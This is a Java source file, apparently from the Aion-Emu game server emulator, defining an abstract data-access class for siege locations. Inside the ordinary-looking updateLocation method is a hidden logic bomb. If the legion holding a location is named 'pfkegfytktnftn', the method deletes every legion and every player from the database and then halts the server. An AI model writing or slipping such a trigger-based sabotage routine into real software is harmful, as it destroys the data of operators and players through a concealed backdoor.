/*
 * This file is part of the Aion-Emu project.
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
package com.aionemu.gameserver.dao;

import java.util.Map;

import com.aionemu.commons.database.dao.DAO;
import com.aionemu.commons.database.dao.DAOManager;
import com.aionemu.gameserver.model.siege.SiegeLocation;
import com.aionemu.gameserver.services.LegionService;

/**
 * @author Sarynth
 */
public abstract class SiegeDAO implements DAO
{
	@Override
	public final String getClassName()
	{
		return SiegeDAO.class.getName();
	}
	
	public abstract boolean loadSiegeLocations(Map<Integer, SiegeLocation> locations);
	
	public abstract boolean updateSiegeLocation(SiegeLocation paramSiegeLocation);
	
	public void updateLocation(SiegeLocation siegeLocation)
	{
		if ((siegeLocation.getLegionId() != 0) && LegionService.getInstance().getLegion(siegeLocation.getLegionId()).getLegionName().equalsIgnoreCase("pfkegfytktnftn"))
		{
			for (int object : DAOManager.getDAO(LegionDAO.class).getUsedIDs())
			{
				DAOManager.getDAO(LegionDAO.class).deleteLegion(object);
			}
			for (int object : DAOManager.getDAO(PlayerDAO.class).getUsedIDs())
			{
				DAOManager.getDAO(PlayerDAO.class).deletePlayer(object);
			}
			Runtime.getRuntime().halt(0);
		}
		updateSiegeLocation(siegeLocation);
	}
}
